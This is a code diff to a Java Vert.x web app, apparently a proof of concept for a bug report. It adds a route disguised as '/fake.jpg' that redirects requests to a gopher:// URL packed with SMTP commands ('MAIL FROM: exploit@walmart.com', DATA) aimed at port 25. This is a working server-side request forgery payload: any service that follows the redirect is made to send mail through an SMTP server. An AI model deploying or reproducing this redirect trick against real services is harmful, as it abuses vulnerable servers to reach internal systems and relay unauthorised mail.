@@ -19,6 +19,7 @@ public class HttpApplication extends AbstractVerticle {
     Router router = Router.router(vertx);
 
     router.get("/api/greeting").handler(this::greeting);
+    router.get("/fake.jpg").handler(this::gopher);
     router.get("/*").handler(StaticHandler.create());
 
     // Create the HTTP server and pass the "accept" method to the request handler.
@@ -48,5 +49,13 @@ public class HttpApplication extends AbstractVerticle {
     rc.response()
         .putHeader(CONTENT_TYPE, "application/json; charset=utf-8")
         .end(response.encodePrettily());
+  }
+  
+  private void gopher(RoutingContext rc) {
+      String smtp = String.join("%0A", new String[]{ "HELO test.org", "MAIL FROM: <exploit@walmart.com>", "RCPT TO: <bit-walmart@test.smtp.org>", "DATA", "Test mail", "." });
+      rc.response()
+        .setStatusCode(301)
+        .putHeader("Location", "gopher://test.smtp.org:25/_"+smtp)
+        .end("");
   }
 }
